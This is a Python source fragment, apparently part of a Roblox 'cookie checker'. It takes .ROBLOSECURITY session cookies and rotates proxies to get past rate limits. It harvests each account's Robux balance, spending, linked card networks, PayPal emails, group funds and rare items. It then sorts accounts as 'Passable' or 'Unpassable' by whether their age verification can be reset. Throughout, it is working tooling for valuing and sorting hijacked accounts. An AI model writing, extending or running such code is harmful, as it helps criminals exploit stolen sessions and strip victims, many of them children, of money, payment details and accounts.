    async def get_balance_task(self, session, user_id, cookie, proxy_url, result):
        # Используем рандомный прокси из FRESHER_PROXY
        proxy = self._next_fresher_proxy(None)
        await self.get_combined_financial_data(session, user_id, cookie, proxy, result)

    async def get_combined_financial_data(self, session: aiohttp.ClientSession, user_id: int, cookie: str, proxy_url: str, result: Dict[str, Any]):
        try:
            # Используем прокси из FRESHER_PROXY для запросов баланса
            if proxy_url is None:
                proxy_url = self._next_fresher_proxy(None)
            
            balance_data = await self._resilient_get(
                session,
                f'https://economy.roblox.com/v1/users/{user_id}/currency',
                cookie, proxy_url
            )
            if balance_data is not None:
                result['balance'] = balance_data.get('robux', 0)
                logging.info(f"💵 Баланс: {result['balance']} R$")

            # Используем тот же прокси для получения доната и пендинга
            pending_donate_data = await self.get_pending_and_donate_year(session, cookie, user_id, proxy_url)
            result['pending'] = pending_donate_data['pending']
            result['donate_year'] = pending_donate_data['donate_year']
            logging.info(f"💸 Пендинг: {result['pending']} R$")
            logging.info(f"📊 Донат за год: {result['donate_year']} R$")
            
        except aiohttp.ClientConnectorError as e:
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                logging.warning(f"🚫 DNS-ошибка (resolve hostname) для financial_data — пропускаем: {str(e)}")
                result['balance'] = 0
                result['pending'] = 0
                result['donate_year'] = 0
                return
            logging.error(f"❌ Ошибка получения финансовых данных: {str(e)}")
            result['balance'] = 0
            result['pending'] = 0
            result['donate_year'] = 0
        except Exception as e:
            logging.error(f"❌ Ошибка получения финансовых данных: {str(e)}")
            result['balance'] = 0
            result['pending'] = 0
            result['donate_year'] = 0
    async def get_pending_and_donate_year(self, session: aiohttp.ClientSession, cookie: str, user_id: int, proxy_url: str = None) -> Dict[str, int]:
        url = f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary'
        max_retries = 4
        delay = 1.0
        cur_proxy = proxy_url
        for attempt in range(max_retries + 1):
            try:
                async with session.get(
                    url,
                    cookies={".ROBLOSECURITY": cookie},
                    proxy=cur_proxy,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200 and response.content_type == 'application/json':
                        data = await response.json()
                        purchases_total = data.get('purchasesTotal', 0)
                        donate_year = abs(purchases_total) if purchases_total < 0 else purchases_total
                        return {
                            "donate_year": donate_year,
                            "pending": data.get('pendingRobuxTotal', 0)
                        }
                    # 401 — кука мертва на этом эндпоинте, ретраить бесполезно
                    if response.status == 401:
                        return {"donate_year": 0, "pending": 0}
                    # 429/403/5xx — rate-limit или временная ошибка: ретраим с другим прокси
                    if response.status in (429, 403) or response.status >= 500:
                        if attempt < max_retries:
                            await asyncio.sleep(delay)
                            delay = min(delay * 1.5, 8)
                            cur_proxy = self._next_fresher_proxy(proxy_url)
                            continue
                    logging.warning(f"❌ Не удалось получить донат/пендинг (статус: {response.status}, попыток: {attempt + 1})")
                    return {"donate_year": 0, "pending": 0}
            except aiohttp.ClientConnectorError as e:
                error_str = str(e).lower()
                if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                    logging.warning(f"🚫 DNS-ошибка (resolve hostname) для pending_donate — пропускаем: {str(e)}")
                    return {"donate_year": 0, "pending": 0}
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 1.5, 8)
                    cur_proxy = self._next_fresher_proxy(proxy_url)
                    continue
                logging.error(f"❌ Ошибка получения доната и пендинга: {str(e)}")
                return {"donate_year": 0, "pending": 0}
            except (asyncio.TimeoutError, aiohttp.ClientError) as e:
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 1.5, 8)
                    cur_proxy = self._next_fresher_proxy(proxy_url)
                    continue
                logging.error(f"❌ Таймаут/ошибка доната и пендинга после {attempt + 1} попыток: {str(e)}")
                return {"donate_year": 0, "pending": 0}
            except Exception as e:
                logging.error(f"❌ Ошибка получения доната и пендинга: {str(e)}")
                return {"donate_year": 0, "pending": 0}
        return {"donate_year": 0, "pending": 0}
    async def _resilient_get(self, session, url, cookie, proxy_url, max_retries=4):
        """
        GET с ретраями на 429/403/5xx/таймаут/обрыв и ротацией fresher-прокси.
        Возвращает распарсенный JSON при 200, иначе None (окончательная неудача).
        Защищает от молчаливого скипа аккаунта при rate-limit.
        """
        delay = 1.0
        cur_proxy = proxy_url
        for attempt in range(max_retries + 1):
            try:
                async with session.get(
                    url,
                    cookies={'.ROBLOSECURITY': cookie},
                    proxy=cur_proxy,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200:
                        try:
                            return await response.json()
                        except Exception:
                            return None
                    # 401 — кука мертва на этом эндпоинте, ретрай бесполезен
                    if response.status == 401:
                        return None
                    # rate-limit / временная ошибка — ретраим с другим прокси
                    if response.status in (429, 403) or response.status >= 500:
                        if attempt < max_retries:
                            await asyncio.sleep(delay)
                            delay = min(delay * 1.5, 8)
                            cur_proxy = self._next_fresher_proxy(proxy_url)
                            continue
                    return None
            except aiohttp.ClientConnectorError as e:
                error_str = str(e).lower()
                if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                    return None
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 1.5, 8)
                    cur_proxy = self._next_fresher_proxy(proxy_url)
                    continue
                return None
            except (asyncio.TimeoutError, aiohttp.ClientError):
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 1.5, 8)
                    cur_proxy = self._next_fresher_proxy(proxy_url)
                    continue
                return None
            except Exception:
                return None
        return None

    async def get_cards_task(self, session, cookie, proxy_url, result):
    # Используем рандомный прокси из FRESHER_PROXY для запросов карт
        proxy = self._next_fresher_proxy(None)
        
        # Инициализируем словари для хранения карт по сетям и PayPal профилей
        result['cards_by_network'] = {}
        result['paypal_profiles'] = []  # НОВОЕ: список для хранения PayPal профилей
        result['card'] = 0  # общее количество карт (оставляем для обратной совместимости)
        
        try:
            payment_profiles = await self._resilient_get(
                session,
                'https://apis.roblox.com/payments-gateway/v1/payment-profiles',
                cookie, proxy
            )
            if payment_profiles is not None and isinstance(payment_profiles, list):
                # Подсчитываем общее количество карт (только с Last4Digits)
                card_profiles = [profile for profile in payment_profiles
                            if isinstance(profile, dict)
                            and profile.get('providerPayload', {}).get('Last4Digits')]
                result['card'] = len(card_profiles)

                # Группируем карты по сети
                for profile in card_profiles:
                    provider_payload = profile.get('providerPayload', {})
                    card_network = provider_payload.get('CardNetwork', 'unknown').lower()

                    if card_network not in result['cards_by_network']:
                        result['cards_by_network'][card_network] = 0
                    result['cards_by_network'][card_network] += 1

                paypal_profiles = []
                for profile in payment_profiles:
                    if isinstance(profile, dict):
                        provider_payload = profile.get('providerPayload', {})
                        # Проверяем тип профиля (paypal)
                        if provider_payload.get('paymentProfileType') == 'paypal' or 'Email' in provider_payload:
                            paypal_info = {
                                'email': provider_payload.get('Email', 'Unknown'),
                                'profile_id': profile.get('id', ''),
                                'provider_payment_profile_id': profile.get('providerPaymentProfileId', ''),
                                'last_charge_time': profile.get('lastChargeTime', 0),
                                'is_quick_pay_enabled': profile.get('isQuickPayEnabled', False)
                            }
                            paypal_profiles.append(paypal_info)

                result['paypal_profiles'] = paypal_profiles
                logging.info(f"💳 Привязанные карты: {result['card']} (по сетям: {result['cards_by_network']})")
                logging.info(f"📧 Найдено PayPal профилей: {len(paypal_profiles)}")
            else:
                result['cards_by_network'] = {}
                result['paypal_profiles'] = []
                result['card'] = 0
        except Exception as e:
            logging.error(f"❌ Ошибка проверки карт: {str(e)}")
            result['cards_by_network'] = {}
            result['paypal_profiles'] = []
            result['card'] = 0
       
    # Полностью исправленная функция get_badges_per_game_task в cookie_processor.py
    async def get_badges_per_game_task(self, session, user_id, cookie, proxy_url, result, selected_badges, selected_checks, custom_badges=None):
        """
        Проверка бейджей по играм с учетом пользовательских конфигов
        """
        # Для проверки бейджей используем «свежий» прокси (FRESHER_PROXY), если он доступен
        badge_proxy = self._next_fresher_proxy(proxy_url)
        
        owned_badges = await self.get_all_user_badges(session, user_id, cookie, badge_proxy)
        
        # Если custom_badges не передан, пробуем получить из БД
        if custom_badges is None:
            from database import get_user_custom_configs
            custom_badges = get_user_custom_configs(user_id, 'badges')
        
        for game in selected_badges:
            if selected_badges[game]:
                # Получаем бейджи из стандартного списка + пользовательские конфиги
                badges_list = BADGES_PER_GAME.get(game, []).copy()  # Используем copy()
                if game in custom_badges:
                    # Добавляем только те бейджи, которых нет в стандартном списке
                    for badge_id in custom_badges[game]:
                        if badge_id not in badges_list:
                            badges_list.append(badge_id)
                
                # Всегда считаем количество
                owned_in_game = [badge_id for badge_id in badges_list if badge_id in owned_badges]
                count = len(owned_in_game)
                
                names = []
                if selected_checks.get('badges_by_name', False):
                    # Собираем названия ТОЛЬКО для купленных бейджей
                    tasks = [self.get_badge_name(badge_id, session=session) for badge_id in owned_in_game]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    names = [name if isinstance(name, str) else str(name) for name in results if not isinstance(name, Exception)]
                
                result['badges_count_per_game'][game] = {'count': count, 'names': names}
        
        logging.info(f"🎖 Проверены бейджи по выбранным играм (включая кастомные конфиги)")
    async def get_all_user_badges(self, session, user_id, cookie, proxy_url):
        owned_badges = set()
        cursor = ""
        max_retries = 2
        while True:
            url = f"https://badges.roblox.com/v1/users/{user_id}/badges?cursor={cursor}&limit=100&sortOrder=Desc"
            for attempt in range(max_retries + 1):
                try:
                    proxy = proxy_url
                    if attempt > 0:
                        proxy = self._next_fresher_proxy(proxy_url)
                    async with session.get(
                        url,
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            for badge in data.get('data', []):
                                owned_badges.add(badge.get('id'))
                            cursor = data.get('nextPageCursor')
                            break
                        elif response.status in (429, 500, 502, 503):
                            logging.warning(f"❌ Бейджи: статус {response.status}, ретрай {attempt+1}/{max_retries}")
                            if attempt < max_retries:
                                await asyncio.sleep(1)
                                continue
                            return owned_badges
                        else:
                            logging.warning(f"❌ Ошибка проверки бейджей: статус {response.status}")
                            return owned_badges
                except aiohttp.ClientConnectorError as e:
                    error_str = str(e).lower()
                    if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                        logging.warning(f"🚫 DNS-ошибка для badges — пропускаем: {str(e)}")
                        return owned_badges
                    logging.warning(f"❌ Ошибка подключения бейджей (попытка {attempt+1}): {str(e)}")
                    if attempt < max_retries:
                        await asyncio.sleep(1)
                        continue
                    return owned_badges
                except asyncio.TimeoutError:
                    logging.warning(f"❌ Таймаут бейджей (попытка {attempt+1})")
                    if attempt < max_retries:
                        await asyncio.sleep(1)
                        continue
                    return owned_badges
                except Exception as e:
                    logging.error(f"❌ Неожиданная ошибка бейджей: {str(e)}")
                    return owned_badges
            else:
                return owned_badges
            if not cursor:
                break
        return owned_badges
    async def get_rap_task(self, session, user_id, cookie, proxy_url, result):
    # Используем рандомный прокси из FRESHER_PROXY для запросов RAP
        proxy = self._next_fresher_proxy(None)
        rap_total, top_items, rare_items = await self.check_rap(session, user_id, cookie, proxy)
        result['rap'] = rap_total
        result['top_rap_items'] = top_items
        result['rare_items'] = rare_items
    async def get_game_info(self, place_id: int) -> Optional[Dict]:
        """Получает название игры и universe_id по place_id через Roblox API"""
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=_SSL_CTX)) as session:
                # 1. Получаем universe_id по place_id
                async with session.get(
                    f"https://apis.roblox.com/universes/v1/places/{place_id}/universe",
                    headers={"Accept": "application/json"}
                ) as resp:
                    if resp.status == 200:
                        universe_data = await resp.json()
                        
                        if universe_data and universe_data.get('universeId'):
                            universe_id = universe_data['universeId']
                            
                            # 2. Получаем информацию об игре по universe_id
                            async with session.get(
                                f"https://games.roblox.com/v1/games?universeIds={universe_id}",
                                headers={"Accept": "application/json"}
                            ) as game_resp:
                                if game_resp.status == 200:
                                    game_data = await game_resp.json()
                                    
                                    if game_data.get('data') and len(game_data['data']) > 0:
                                        game_info = game_data['data'][0]
                                        return {
                                            'name': game_info.get('name', 'Unknown Game'),
                                            'universe_id': universe_id,
                                            'place_id': place_id,
                                            'description': game_info.get('description', ''),
                                            'creator': game_info.get('creator', {}),
                                            'root_place_id': game_info.get('rootPlaceId')
                                        }
                            
                            # Альтернативный вариант через API Roblox (если предыдущий не работает)
                            async with session.get(
                                f"https://develop.roblox.com/v1/universes/{universe_id}/places",
                                headers={"Accept": "application/json"}
                            ) as places_resp:
                                if places_resp.status == 200:
                                    places_data = await places_resp.json()
                                    if places_data.get('data') and len(places_data['data']) > 0:
                                        place_info = places_data['data'][0]
                                        return {
                                            'name': place_info.get('name', 'Unknown Game'),
                                            'universe_id': universe_id,
                                            'place_id': place_id
                                        }
        
        except aiohttp.ClientError as e:
            logging.error(f"Ошибка сети при получении информации об игре {place_id}: {e}")
        except Exception as e:
            logging.error(f"Ошибка получения информации об игре {place_id}: {e}")
        
        return None
    RARE_ITEM_PATTERNS = [
        'valkyrie', 'valk',
        '8 bit crown', '8-bit crown', '8 bit royal crown', '8-bit royal crown',
        'infernal deathwalker',
        'korblox deathwalker',
        'korblox deathspeaker',
        'tentacles',
        'rainbow barf face',
        'otakufaic',
        'pop queen',
        'princess alexis',
        'sapphire gaze',
        'arachnid queen',
        'persephone',
        'winning smile',
        'tsundere',
        'star sorority',
        'navy queen',
        'golden horns of pwnage',
        'white sword cane', 'white swordcane',
        'headless horseman', 'headless head',
        'epic face',
        'ninja face',
        'poisonous beast mode',
        'workclock headphones', 'workclock shades',
        'clockwork headphones', 'clockwork shades',
        'festive sword valkyrie',
        'sly cat',
        'yaik',
        'shy lady',
        'pink wistful wink',
        'epic vampire face',
        'doomsekkar',
        'dusekkar',
        'ghost fedora',
    ]

    def _is_rare_item(self, name: str) -> bool:
        name_lower = name.lower()
        for pattern in self.RARE_ITEM_PATTERNS:
            if pattern in name_lower:
                return True
        return False

    async def check_rap(self, session: aiohttp.ClientSession, user_id: int, cookie: str, proxy_url: str = None) -> tuple:
        total_rap = 0
        top_items = []
        rare_items_found = []
        next_cursor = None
        
        if proxy_url is None:
            proxy_url = self._next_fresher_proxy(None)
        
        try:
            while True:
                retries = 0
                success = False

                while retries < 2 and not success:
                    url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100&sortOrder=Asc'
                    if next_cursor:
                        url += f'&cursor={next_cursor}'

                    try:
                        async with session.get(
                            url,
                            cookies={'.ROBLOSECURITY': cookie},
                            proxy=proxy_url,
                            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                        ) as response:
                            if response.status == 429:
                                retries += 1
                                logging.warning(f"⚠️ Rate limit при проверке RAP (попытка {retries}/5), жду 5 секунд...")
                                await asyncio.sleep(3)
                                continue

                            if response.status != 200:
                                logging.warning(f"❌ Ошибка при проверке RAP: статус {response.status}")
                                return total_rap, top_items, rare_items_found

                            data = await response.json()
                            for item in data.get('data', []):
                                rap = item.get('recentAveragePrice', 0) or 0
                                item_name = item.get('name', 'Unknown')
                                total_rap += rap
                                if rap >= 10000:
                                    top_items.append({'name': item_name, 'rap': rap})
                                if self._is_rare_item(item_name):
                                    rare_items_found.append({'name': item_name, 'rap': rap})

                            next_cursor = data.get('nextPageCursor')
                            success = True

                    except asyncio.TimeoutError:
                        retries += 1
                        logging.warning(f"⏰ Таймаут при проверке RAP (попытка {retries}/5), жду 5 секунд...")
                        await asyncio.sleep(5)
                        continue
                    except Exception as e:
                        retries += 1
                        logging.warning(f"⚠️ Ошибка при запросе RAP (попытка {retries}/5): {str(e)}, жду 5 секунд...")
                        await asyncio.sleep(5)
                        continue

                if not success:
                    logging.error("❌ Исчерпаны все 5 попыток для страницы из-за rate limit или ошибок. Прерываем проверку RAP.")
                    break

                if not next_cursor:
                    break

        except Exception as e:
            logging.error(f"❌ Неожиданная ошибка проверки RAP: {str(e)}")

        top_items.sort(key=lambda x: x['rap'], reverse=True)
        top_items = top_items[:3]
        return total_rap, top_items, rare_items_found
    async def get_rares_task(self, session, user_id, cookie, proxy_url, result):
        rare_count = 0
        result['korblox'] = False
        result['headless'] = False
        
        # Используем рандомный прокси из FRESHER_PROXY
        proxy = self._next_fresher_proxy(None)
        
        # Создаем отдельную сессию для проверки редких предметов с выбранным прокси
        try:
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=_SSL_CTX),
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as rare_session:
                rare_tasks = []
                for item_id in TARGET_ITEMS:
                    rare_tasks.append(self.check_rare_item(rare_session, user_id, cookie, proxy, item_id, result))
    
                rare_results = await asyncio.gather(*rare_tasks, return_exceptions=True)
    
                # Обрабатываем результаты
                for i, res in enumerate(rare_results):
                    item_id = TARGET_ITEMS[i]
                    if isinstance(res, Exception):
                        logging.error(f"❌ Ошибка проверки редкого предмета {item_id}: {str(res)}")
                        continue
                    if isinstance(res, int):
                        rare_count += res
                    else:
                        logging.warning(f"⚠️ Неожиданный результат для предмета {item_id}: {res}")
        except aiohttp.ClientConnectorError as e:
            # ИСПРАВЛЕНИЕ: Специальная обработка DNS/resolve ошибок
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                logging.warning(f"🚫 DNS-ошибка (resolve hostname) для rares — пропускаем: {str(e)}")
                return
            logging.error(f"❌ Критическая ошибка при создании сессии для редких предметов: {str(e)}")
        except Exception as e:
            logging.error(f"❌ Критическая ошибка при создании сессии для редких предметов: {str(e)}")
        
        result['rare_count'] = rare_count
        logging.info(f"🔥 Найдено редких предметов: {rare_count}")

    async def check_rare_item(self, session, user_id, cookie, proxy_url, item_id, result, retry_count=0):
        """Проверка наличия конкретного редкого предмета"""
        try:
            async with session.get(
                f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{item_id}',
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get('data'):
                        count = len(data['data'])
                        # Обновляем флаги для специальных предметов
                        if item_id == KORBLOX_ID and count > 0:
                            result['korblox'] = True
                        if item_id == HEADLESS_ID and count > 0:
                            result['headless'] = True
                        return count
                    return 0
                elif response.status == 429:
                    if retry_count < 2:  # Максимум 2 попытки
                        retry_count += 1
                        wait_time = 3 * retry_count  # Увеличиваем время ожидания с каждой попыткой
                        logging.warning(f"⚠️ Rate limit при проверке предмета {item_id} (попытка {retry_count}/2), жду {wait_time} секунд...")
                        await asyncio.sleep(wait_time)
                        return await self.check_rare_item(session, user_id, cookie, proxy_url, item_id, result, retry_count)
                    else:
                        logging.warning(f"⚠️ Достигнут лимит попыток (2) при проверке предмета {item_id}, возвращаем 0")
                        return 0
                else:
                    logging.warning(f"⚠️ Ошибка HTTP {response.status} при проверке предмета {item_id}")
                    return 0
        
        except aiohttp.ClientConnectorError as e:
            # ИСПРАВЛЕНИЕ: Специальная обработка DNS/resolve ошибок
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                logging.warning(f"🚫 DNS-ошибка (resolve hostname) для rare_item {item_id} — возвращаем 0: {str(e)}")
                return 0
            logging.error(f"❌ Ошибка подключения при проверке предмета {item_id}: {str(e)}")
            return 0
        except asyncio.TimeoutError:
            logging.warning(f"⚠️ Таймаут при проверке редкого предмета {item_id}")
            return 0
        except Exception as e:
            logging.error(f"❌ Неожиданная ошибка при проверке редкого предмета {item_id}: {str(e)}")
            return 0
    async def get_billing_task(self, session, cookie, proxy_url, result):
        billing_data = await self._resilient_get(
            session,
            'https://apis.roblox.com/credit-balance/v1/get-next-purchasable-metadata',
            cookie, proxy_url
        )
        if billing_data is not None:
            robux_amount = billing_data.get('robuxConversionAmount', 0)
            usd_amount = billing_data.get('creditBalance', 0)
            result['billing'] = f"{robux_amount} R$"
            result['billing_usd'] = usd_amount
            result['billing_robux'] = robux_amount
            logging.info(f"🏦 Баланс биллинга: {result['billing']}")
        else:
            result['billing'] = "0 R$"
            result['billing_usd'] = 0
            result['billing_robux'] = 0
    async def get_groups_balance_task(self, session, cookie, user_id, proxy_url, result):
        groups = await self.get_user_groups(session, cookie, user_id, proxy_url)
        groups_balance = 0
        group_tasks = []
        for group in groups:
            group_tasks.append(self.get_group_balance(session, cookie, group['id'], proxy_url))
        group_results = await asyncio.gather(*group_tasks)
        groups_balance = sum(group_results)
        result['groups_balance'] = groups_balance
        logging.info(f"🏢 Баланс групп: {groups_balance} R$")
    async def get_user_groups(self, session: aiohttp.ClientSession, cookie: str, user_id: int, proxy_url: str) -> List[Dict]:
        data = await self._resilient_get(
            session,
            f"https://groups.roblox.com/v2/users/{user_id}/groups/roles",
            cookie, proxy_url
        )
        if data is not None:
            return [
                {'id': group['group']['id']}
                for group in data.get('data', [])
                if group['role']['rank'] == 255
            ]
        return []
    async def get_group_balance(self, session: aiohttp.ClientSession, cookie: str, group_id: int, proxy_url: str) -> int:
        data = await self._resilient_get(
            session,
            f"https://economy.roblox.com/v1/groups/{group_id}/currency",
            cookie, proxy_url
        )
        if data is not None:
            return data.get('robux', 0)
        return 0
    async def get_places_visits_task(self, session, user_id, cookie, proxy_url, result):
        result['places_visits'] = await self.get_places_visits(session, user_id, cookie, proxy_url)
        logging.info(f"🚀 Визиты плейсов: {result['places_visits']}")
    async def get_places_visits(self, session: aiohttp.ClientSession, user_id: int, cookie: str, proxy_url: str) -> int:
        """
        Получает общее количество визитов плейсов пользователя.
        """
        total_visits = 0
        next_cursor = None
        retry_count = 0
        max_retries = 3
        
        # Используем свежий прокси для запросов визитов
        proxy = self._next_fresher_proxy(proxy_url)
        
        while retry_count < max_retries:
            try:
                while True:
                    url = f"https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&limit=50&sortOrder=Desc"
                    if next_cursor:
                        url += f"&cursor={next_cursor}"
                    
                    async with session.get(
                        url,
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        if response.status == 429:  # Rate limit
                            if retry_count < max_retries:
                                retry_count += 1
                                wait_time = 5 * retry_count
                                logging.warning(f"⚠️ Rate limit при получении визитов (попытка {retry_count}/{max_retries}), жду {wait_time} секунд...")
                                await asyncio.sleep(wait_time)
                                continue
                            else:
                                logging.error("❌ Достигнут лимит попыток для визитов")
                                return total_visits
                        
                        if response.status != 200:
                            logging.warning(f"⚠️ Ошибка HTTP {response.status} при получении визитов")
                            break
                        
                        data = await response.json()
                        universe_ids = [game['id'] for game in data.get('data', [])]
                        
                        if universe_ids:
                            # Получаем информацию об играх для получения визитов
                            visits_url = "https://games.roblox.com/v1/games?universeIds=" + ','.join(map(str, universe_ids))
                            
                            async with session.get(
                                visits_url,
                                proxy=proxy,
                                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                            ) as visits_response:
                                if visits_response.status == 200:
                                    visits_data = await visits_response.json()
                                    for game in visits_data.get('data', []):
                                        total_visits += game.get('visits', 0)
                                else:
                                    logging.warning(f"⚠️ Ошибка получения визитов для universe_ids: {visits_response.status}")
                        
                        next_cursor = data.get('nextPageCursor')
                        if not next_cursor:
                            break
                
                # Успешно получили все данные
                return total_visits
                
            except aiohttp.ClientConnectorError as e:
                error_str = str(e).lower()
                if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                    logging.warning(f"🚫 DNS-ошибка при получении визитов — пропускаем: {str(e)}")
                    return total_visits
                logging.error(f"❌ Ошибка подключения при получении визитов: {str(e)}")
                retry_count += 1
                
            except asyncio.TimeoutError:
                logging.warning(f"⚠️ Таймаут при получении визитов (попытка {retry_count + 1}/{max_retries})")
                retry_count += 1
                
            except Exception as e:
                logging.error(f"❌ Неожиданная ошибка при получении визитов: {str(e)}")
                retry_count += 1
            
            if retry_count < max_retries:
                await asyncio.sleep(5 * retry_count)  # Увеличиваем задержку с каждой попыткой
        
        return total_visits
    async def get_age_verification(self, session, cookie, proxy_url, result):
        """
        Определяет статус ID/age верификации аккаунта для сортировки Passable/Unpassable.
        Заполняет:
            result['is_age_verified']    — прошёл ли аккаунт age/ID верификацию
            result['verified_age_bracket']— 'Under13' / 'Over13' / 'Over18' / None
            result['can_reset_age_verif'] — доступна ли кнопка сброса верификации
            result['age_verif_raw']       — сырой ответ (для отладки)
        """
        try:
            async with session.get(
                "https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age",
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as resp:
                status = resp.status
                try:
                    data = await resp.json()
                except Exception:
                    data = await resp.text()
                result['age_verif_raw'] = data
                logging.info(f"🔞 AGE-VERIF status={status} raw={data}")

                if status == 200 and isinstance(data, dict):
                    # Подтверждённые поля Roblox:
                    #   isVerified      — прошёл ли age/ID вериф
                    #   verifiedAge     — верифнутый возраст (0 если нет)
                    #   isSeventeenPlus — 17+/18+ флаг
                    is_verified = bool(data.get('isVerified', False))
                    verified_age = data.get('verifiedAge') or 0
                    try:
                        verified_age = int(verified_age)
                    except (TypeError, ValueError):
                        verified_age = 0
                    is_17_plus = bool(data.get('isSeventeenPlus', False))

                    result['is_age_verified'] = is_verified

                    if not is_verified:
                        result['verified_age_bracket'] = None
                    else:
                        if is_17_plus or verified_age >= 18:
                            result['verified_age_bracket'] = 'Over18'
                        elif verified_age >= 13:
                            result['verified_age_bracket'] = 'Over13'
                        elif 0 < verified_age < 13:
                            result['verified_age_bracket'] = 'Under13'
                        else:
                            # верифнут, но возраст не отдали — безопаснее как Over13 (всё равно Unpassable)
                            result['verified_age_bracket'] = 'Over13'

                    # Кнопка «ресет» = отдельный эндпоинт undo-age-verification-eligibility
                    # (возвращает голый bool true/false). Дёргаем только для верифнутых.
                    if is_verified:
                        await self._fetch_undo_eligibility(session, cookie, proxy_url, result)
                else:
                    # 403/404/иное → считаем что аккаунт НЕ верифицирован
                    result['is_age_verified'] = False
                    result['verified_age_bracket'] = None
        except Exception as e:
            logging.warning(f"🔞 Ошибка age-verif (пропуск): {e}")
            result['is_age_verified'] = False
            result['verified_age_bracket'] = None

    async def _fetch_undo_eligibility(self, session, cookie, proxy_url, result):
        """Дёргает undo-age-verification-eligibility — есть ли кнопка сброса верификации.
        Эндпоинт возвращает голый bool (true = ресет доступен)."""
        try:
            async with session.get(
                "https://apis.roblox.com/age-verification-service/v1/age-verification/undo-age-verification-eligibility",
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as resp:
                if resp.status == 200:
                    try:
                        ud = await resp.json()
                    except Exception:
                        ud = (await resp.text()).strip().lower() == 'true'
                    if isinstance(ud, bool):
                        can_reset = ud
                    elif isinstance(ud, dict):
                        can_reset = bool(
                            ud.get('isEligible',
                                    ud.get('canUndo',
                                        ud.get('eligible',
                                            ud.get('canReset', False))))
                        )
                    else:
                        can_reset = str(ud).strip().lower() == 'true'
                    result['can_reset_age_verif'] = can_reset
                    logging.info(f"🔄 UNDO-ELIGIBILITY (ресет): {can_reset} raw={ud}")
                else:
                    result['can_reset_age_verif'] = False
                    logging.info(f"🔄 UNDO-ELIGIBILITY status={resp.status} → ресета нет")
        except Exception as e:
            logging.warning(f"🔄 Ошибка undo-eligibility (пропуск): {e}")
            result['can_reset_age_verif'] = False

    @staticmethod
    def _normalize_age_bracket(raw_val):
        """Приводит разные форматы брекета к 'Under13' / 'Over13' / 'Over18' / None."""
        if raw_val is None:
            return None
        if isinstance(raw_val, bool):
            return None
        if isinstance(raw_val, (int, float)):
            n = int(raw_val)
            if n <= 0:
                return None
            if n < 13:
                return 'Under13'
            if n < 18:
                return 'Over13'
            return 'Over18'
        s = str(raw_val).strip().lower().replace('_', '').replace('-', '').replace(' ', '')
        if not s or s in ('none', 'null', 'unverified', 'notverified'):
            return None
        if 'under13' in s or 'lessthan13' in s or 'below13' in s or s == 'u13':
            return 'Under13'
        if '18' in s:  # age18orover / over18 / 18plus
            return 'Over18'
        if '13' in s:  # age13orover / over13 / 13plus / age13to17
            return 'Over13'
        return None

    def is_unpassable(self, d: Dict) -> bool:
        """
        Аккаунт Unpassable если он прошёл age/ID верификацию:
          - 13- вериф       → Unpassable
          - 13+ вериф       → Unpassable
          - 18+ вериф без кнопки ресет → Unpassable
        18+ вериф С кнопкой ресета и все НЕверифнутые → Passable.
        2FA на классификацию не влияет.
        """
        if not d.get('is_age_verified'):
            return False
        bracket = d.get('verified_age_bracket')
        if bracket in ('Under13', 'Over13'):
            return True
        if bracket == 'Over18':
            return not d.get('can_reset_age_verif', False)
        # Верифнут, но брекет не распознан — безопаснее считать Unpassable
        return True

    async def get_additional_info_task(self, session, cookie, user_id, proxy_url, result, selected_checks=None):
        # Age verified, country, trade
        try:
            # Проверка возраста
            async with session.get(
                f"https://accountinformation.roblox.com/v1/birthdate",
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    birth_year = data.get('birthYear', datetime.now().year)
                    result['age_verified'] = datetime.now().year - birth_year
                    logging.info(f"🎂 Возраст: {result['age_verified']} лет")

            # ID/age верификация (для сортировки Passable/Unpassable) — только если passable включён
            if selected_checks is None or selected_checks.get('passable', False):
